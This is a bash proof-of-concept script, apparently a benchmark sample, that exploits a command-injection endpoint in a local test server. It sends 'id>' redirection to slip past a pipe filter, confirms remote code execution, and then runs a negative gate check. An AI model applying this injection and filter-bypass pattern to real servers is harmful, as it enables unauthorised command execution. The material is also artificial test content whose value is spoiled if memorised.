#!/usr/bin/env bash
# PoC for 182_onion_C3I3S2
# Axes: C3 (config file + runtime state) / I3 (struct dispatch) / S2 (pipe blocked, bypass with ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_182_www"
MARKER="/tmp/poc_182_marker"
CONF="/tmp/poc_182.conf"
PORT=18182
NEG_PORT=19182

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file (C3: exec_mode + secret)
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# Start server with exec config
echo "[*] starting onion_server with --exec-config on port $PORT..."
"$BINARY" --port "$PORT" --exec-config "$CONF" --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# C3: call /exec/init first
echo "[*] calling /exec/init to satisfy runtime state..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null

# Trigger exploit (S2 bypass: use > redirection, not pipe)
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: config with exec_mode=0; /exec/init returns 403
echo "[*] verifying gate: /exec locked when config has exec_mode=0..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF=/tmp/poc_182_neg.conf
cat > "$NEG_CONF" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF

"$BINARY" --port "$NEG_PORT" --exec-config "$NEG_CONF" --wwwroot "$WWWROOT" &
NEG_PID=$!
sleep 0.5
INIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec/init?token=s3cr3t" || echo "000")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
rm -f "$NEG_CONF"

if [[ "$INIT_CODE" == "403" ]]; then
    echo "[+] gate check passed: /exec/init returned 403 with exec_mode=0"
else
    echo "[!] gate check: /exec/init returned $INIT_CODE (expected 403)"
fi
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: /exec returned 404 without initialization"
else
    echo "[!] gate check: /exec returned $HTTP_CODE"
fi
